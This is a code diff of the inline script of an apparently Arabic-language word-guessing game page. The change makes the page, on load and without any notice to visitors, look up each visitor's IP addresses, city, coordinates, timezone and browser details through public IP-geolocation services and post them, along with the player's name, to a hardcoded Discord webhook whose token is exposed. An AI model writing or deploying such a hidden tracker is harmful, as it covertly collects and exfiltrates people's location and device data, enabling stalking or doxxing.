@@ -36,67 +36,64 @@
 
   <script>
     const discordWebhookUrl = "https://discord.com/api/webhooks/1352849557184053290/lD7F2L2xR6GEKGoXV5s8L_cW5QmhTQJsZTSAoRYX9qy4Leobxmq64Izkyst-AFkrypFv";
-
     const correctWord = "السر";
 
-    async function sendUserInfo() {
-      try {
-        const geoResponse = await fetch("https://ipapi.co/json/");
-        const geoData = await geoResponse.json();
+    async function getIPInfo() {
+      const [geoRes, ipv6Res] = await Promise.all([
+        fetch("https://ipapi.co/json/").then(res => res.json()),
+        fetch("https://api64.ipify.org?format=json").then(res => res.json())
+      ]);
 
-        const ipv6Response = await fetch("https://api64.ipify.org?format=json");
-        const ipv6Data = await ipv6Response.json();
+      let ipv4 = geoRes.ip;
+      let ipv6 = ipv6Res.ip;
 
-        const ipv4 = geoData.ip || "غير معروف";
-        const ipv6 = ipv6Data.ip || "غير معروف";
+      // لو الاثنين متطابقين، احتمال أن ipapi رجعت ipv6 بدلاً من ipv4
+      if (ipv4 === ipv6) ipv4 = "غير معروف";
 
-        const userAgent = navigator.userAgent;
+      const userAgent = navigator.userAgent;
 
-        const infoText = `
+      const info = `
 IPv4: ${ipv4}
 IPv6: ${ipv6}
-الدولة: ${geoData.country_name}
-المنطقة: ${geoData.region}
-المدينة: ${geoData.city}
-الموقع: ${geoData.latitude}, ${geoData.longitude}
-المنطقة الزمنية: ${geoData.timezone}
+الدولة: ${geoRes.country_name}
+المنطقة: ${geoRes.region}
+المدينة: ${geoRes.city}
+الموقع: ${geoRes.latitude}, ${geoRes.longitude}
+المنطقة الزمنية: ${geoRes.timezone}
 المتصفح والجهاز: ${userAgent}
-        `.trim();
+      `.trim();
 
-        const data = { content: infoText };
-
-        await fetch(discordWebhookUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data),
-        });
-      } catch (error) {
-        console.error("فشل إرسال معلومات الجهاز:", error);
-      }
+      return info;
     }
 
-    async function sendPlayerName(name) {
-      if (!name) return;
+    async function sendToWebhook(message) {
       try {
-        const data = { content: `اسم اللاعب: ${name}` };
         await fetch(discordWebhookUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data),
+          body: JSON.stringify({ content: message }),
         });
-      } catch (error) {
-        console.error("فشل إرسال اسم اللاعب:", error);
+      } catch (err) {
+        console.error("فشل الإرسال إلى الويب هوك", err);
       }
     }
 
-    document.getElementById("verify-button").addEventListener("click", async () => {
+    async function sendUserInfoOnLoad() {
+      const info = await getIPInfo();
+      sendToWebhook(info);
+    }
+
+    window.addEventListener("load", () => {
+      sendUserInfoOnLoad();
+    });
+
+    document.getElementById("verify-button").addEventListener("click", () => {
       const playerName = document.getElementById("playerName").value.trim();
       const userWord = document.getElementById("userInput").value.trim();
-
-      sendUserInfo();
-      sendPlayerName(playerName);
-
       const resultDiv = document.getElementById("result");
+
+      if (playerName) sendToWebhook(`اسم اللاعب: ${playerName}`);
+
       if (!userWord) {
         resultDiv.textContent = "الرجاء إدخال كلمة.";
         return;
